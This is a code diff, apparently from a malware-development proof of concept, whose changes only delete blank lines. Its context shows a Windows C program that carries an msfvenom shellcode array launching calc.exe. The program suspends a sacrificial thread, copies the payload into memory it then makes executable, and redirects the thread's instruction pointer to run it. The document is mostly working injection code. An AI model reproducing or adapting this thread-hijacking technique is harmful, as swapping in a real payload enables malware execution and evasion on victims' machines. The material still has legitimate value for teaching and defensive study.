@@ -30,7 +30,6 @@ unsigned char MSFVenomCalcPayload[] = {
 	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x00
 };
 
-
 // Benign function for use in the sacrifical thread
 VOID BenignFunction() {
 	int i = 1;
@@ -39,12 +38,10 @@ VOID BenignFunction() {
 	}
 }
 
-
 BOOL LocalThreadHijack(IN HANDLE hTargetThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
 
 	PVOID pPayloadAddress = NULL;
 	DWORD dwOldProtection = NULL;
-
 
 	// Setting the ContextFlags member of the CONTEXT struct before it is called
 	CONTEXT ThreadContext = {
@@ -53,17 +50,14 @@ BOOL LocalThreadHijack(IN HANDLE hTargetThread, IN PBYTE pPayload, IN SIZE_T sPa
 
 	};
 
-
 	// Allocating memory to store the payload
 	pPayloadAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (pPayloadAddress == NULL) {
 		printf("VirtualAlloc failed. Error: %d \n", GetLastError());
 	}
 
-
 	// Copying payload in to the memory we allocated on line 29
 	memcpy(pPayloadAddress, pPayload, sPayloadSize);
-
 
 	// Changing the memory protection (to allow excecution)
 	if (!VirtualProtect(pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
@@ -80,17 +74,14 @@ BOOL LocalThreadHijack(IN HANDLE hTargetThread, IN PBYTE pPayload, IN SIZE_T sPa
 	// Modifying the 'Rip' member of the CONTEXT struct to point to the address of the payload
 	ThreadContext.Rip = pPayloadAddress;
 
-
 	// Setting the new thread context
 	if (!SetThreadContext(hTargetThread, &ThreadContext)) {
 		printf("SetThreadContext failed. Error: %d \n", GetLastError());
 		return FALSE;
 	}
 
-
 	return TRUE;
 }
-
 
 void main() {
 	
@@ -106,14 +97,11 @@ void main() {
 		return FALSE;
 	}
 
-
 	printf("Sacrificial thread running. Thread ID: %d \n", lpThreadId);
-
 
 	// Wait for user to press ENTER to suspend the thread created on line 79
 	printf("Press [ENTER] to suspend sacrificial thread %d \n", lpThreadId);
 	getchar();
-
 	
 	SuspendThread(hSacrificialThread);
 	// Now that the thread is suspended we can move on to...
@@ -128,15 +116,12 @@ void main() {
 		return -1;
 	}
 	
-
 	// Step 3. Resume execution of the hijacked thread and execute payload
 	printf("Sacrificial thread hijacked!\n Press [ENTER] to resume execution\n and run the payload\n");
 	getchar();
 
-
 	ResumeThread(hSacrificialThread);
 	WaitForSingleObject(hSacrificialThread, INFINITE);
-
 
 	printf("Press [ENTER] to quit\n");
 	getchar();
